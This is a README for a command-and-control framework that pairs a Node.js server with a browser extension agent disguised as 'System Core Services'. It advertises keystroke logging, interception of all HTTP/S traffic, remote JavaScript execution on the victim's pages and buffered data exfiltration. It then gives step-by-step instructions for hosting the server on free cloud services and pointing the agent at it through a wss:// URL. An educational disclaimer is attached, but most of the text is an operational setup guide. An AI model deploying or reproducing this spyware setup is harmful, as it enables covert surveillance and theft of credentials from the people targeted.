# README
## Inspector-Extension
C2 Infra [+] Infectious Extension = Booyakasha!
---
	
### C2 Interceptor Framework

A comprehensive Command and Control (C2) framework built with a Node.js backend and a browser extension agent. This tool is designed for educational and research purposes to demonstrate the mechanics of data exfiltration, remote command execution, and real-time monitoring through a web-based dashboard.


---
# ⚠️URGENT: Legal and Ethical Warning

**This software is provided for educational and security research purposes ONLY.**

The functionality demonstrated in this project is designed to mimic the tools used by malicious actors. The purpose of this guide is to help developers, security researchers, and students understand these threats from a defensive perspective.

### **Read This Before Proceeding**

Installing or using this extension on any computer you do not own, or on any device without the owner's explicit, informed, and written consent, is **strictly prohibited and illegal** in most countries.

Such actions can be considered serious criminal offenses, including but not limited to:
*   Unauthorized Access to Computer Systems
*   Computer Fraud and Abuse
*   Illegal Wiretapping and Interception of Electronic Communications

### **Permitted Use Cases Are Strictly Limited To:**

1.  **Personal Educational Use:** Installing both the extension and the server on **your own personal computer** to study how such malware operates in a controlled, isolated environment.
2.  **Professional Security Testing:** Using the tool on a system where you have been given **explicit, written permission** from the system owner as part of a formal penetration test or security assessment.

By proceeding with this setup, you acknowledge that you are solely and fully responsible for your actions. The provider of these files assumes **no liability** for any misuse, damage, or legal consequences that may result from your use or misuse of this software.

**Handle this with the seriousness it deserves. This is a powerful demonstration of a real-world threat, not a toy.**

---
## Architecture Overview

The system consists of three main components: the operator's **Dashboard**, the central **C2 Server**, and the target's **Browser Agent**.


---

## Features

-   **Real-time Device Monitoring:** See which devices are online or offline at a glance.
-   **Keystroke Logging:** Capture keystrokes from any webpage the target visits.
-   **Network Traffic Interception:** Intercept and inspect all HTTP/S requests and responses made by the browser.
-   **Remote Code Execution (RCE):** Run pre-defined or custom JavaScript payloads directly on the target's active webpage.
-   **Comprehensive Data Dashboard:** View all captured data in a clean, filterable, and user-friendly interface.
-   **Data Export:** Export all captured network and keystroke data for a device in multiple formats (JSON, CSV, HAR, TXT).
-   **Traffic Analytics Dashboard:** Visualize traffic patterns with charts showing top domains, request methods.
-   **Resilient Data Exfiltration:** Uses an IndexedDB buffer on the agent to prevent data loss during network interruptions.

---

## Deployment & Installation (Cloud Setup)

This guide will walk you through deploying the C2 framework to a scalable cloud infrastructure using free-tier services.

### Prerequisites

-   A [GitHub](https://github.com/) account.
-   A [MongoDB Atlas](https://www.mongodb.com/cloud/atlas) account (free tier is sufficient).
-   A [Render.com](https://render.com/) account (free tier is sufficient).

### Step 1: Set Up the Database on MongoDB Atlas

The database must be created first, as the C2 server will need its connection string.

1.  **Create a New Project** in your MongoDB Atlas dashboard.
2.  **Build a Database:**
    -   Click **"Build a Database"**.
    -   Choose the **Free `M0` Shared** plan.
    -   Select a cloud provider and region of your choice. Leave other settings as default and click **"Create"**.
3.  **Configure Database Access:**
    -   While the cluster is provisioning, you must create a database user. In the left-hand menu under "Security", go to **"Database Access"**.
    -   Click **"Add New Database User"**.
    -   Enter a **Username** (e.g., `c2user`) and a secure **Password**. Remember this password. Grant the user the `Read and write to any database` role.
    -   Next, you must allow network connections. In the left-hand menu, go to **"Network Access"**.
    -   Click **"Add IP Address"**.
    -   Select **"ALLOW ACCESS FROM ANYWHERE"** (which enters `0.0.0.0/0`).
    -   Click **"Confirm"**.
        > **Security Note:** Allowing access from anywhere is necessary for a dynamic service like Render. For a high-security production environment, you would use more advanced network peering options.
4.  **Get the Connection String:**
    -   Once your cluster is ready, go back to the "Database" view and click the **"Connect"** button on your cluster.
    -   Select **"Drivers"** from the connection methods.
    -   You will see a connection string. Copy it. It will look like this:
        ```
        mongodb+srv://<username>:<password>@clustername.mongodb.net/
        ```

    -   **Important:** Replace `<password>` with the actual password you created. You should also add your desired database name at the end (e.g., `c2_data`). Your final, ready-to-use string will be:
        ```
        mongodb+srv://c2user:YourSecurePassword@clustername.mongodb.net/c2_data
        ```

    **Keep this connection string safe. You will need it for the next step.**

### Step 2: Deploy the C2 Server on Render.com

1.  **Push the Project to GitHub:** Ensure the entire project, including the `webSocketServer` and `extension_folder` directories, is in a GitHub repository.

2.  **Create a New Web Service on Render:**
    -   In your Render dashboard, click **"New +"** and select **"Web Service"**.
    -   Connect your GitHub account and select the repository for this project.
    -   On the settings page, fill in the details:
        -   **Name:** Give your service a unique name (e.g., `c2-ABC-server`).
        -   **Region:** Choose a region close to you.
        -   **Branch:** `main` (or your default branch).
        -   **Root Directory:** `webSocketServer` (This is crucial! It tells Render to run the commands from within this subfolder).
        -   **Build Command:** `npm install`
        -   **Start Command:** `npm start`
        -   **Instance Type:** Select **Free**.

3.  **Add Environment Variables:**
    -   Scroll down to the **"Environment"** section.
    -   Click **"Add Environment Variable"**.
        -   **Key:** `MONGO_URI`
        -   **Value:** Paste the full MongoDB Atlas connection string you prepared in the previous step.
    -   Render automatically provides the `PORT` variable, so you do not need to add it.

4.  **Deploy:**
    -   Click the **"Create Web Service"** button at the bottom.
    -   Render will automatically pull your code, install dependencies, and start the server. You can watch the progress in the logs.
    -   Once deployed, Render will provide you with a public URL, like `https-c2-ABC-server.onrender.com`. **Copy this URL.**

### Step 3: Configure and Load the Agent

The browser agent needs to know the public URL of your deployed server.

1.  **Configure the WebSocket URL:**
    -   Open the file `extension_folder/background.js`.
    -   Find the `wsUrl` configuration line.
    -   **Replace the placeholder URL** with your public Render URL, making sure to use the `wss://` (secure WebSocket) protocol.

    ```javascript
    // extension_folder/background.js

    async function initialize() {
        // ...
        currentConfig = {
            // --- EDIT THIS LINE ---
            wsUrl: `wss://c2-ABC-server.onrender.com/agent-ws`, // Replace with your actual Render URL
            // --------------------
            deviceName: getOrCreateDeviceName(result)
        };
        // ...
    }
    ```

2.  **Load the extension in your browser** (Chrome, Edge, etc.):
    -   Navigate to `chrome://extensions`.
    -   Enable **"Developer mode"**.
    -   Click **"Load unpacked"**.
    -   Select the **entire `extension_folder`** directory.

The "System Core Services" extension is now installed and will connect to your live C2 server.

---

## Usage

1.  **Open the Dashboard:** Navigate to your public Render URL (e.g., `https://c2-ABC-server.onrender.com`).
2.  **Confirm Connection:** The agent you loaded should connect within a few seconds. You will see the device appear in the dropdown with a green dot.
3.  **Monitor & Control:** Select the device and begin monitoring its activity in real-time.
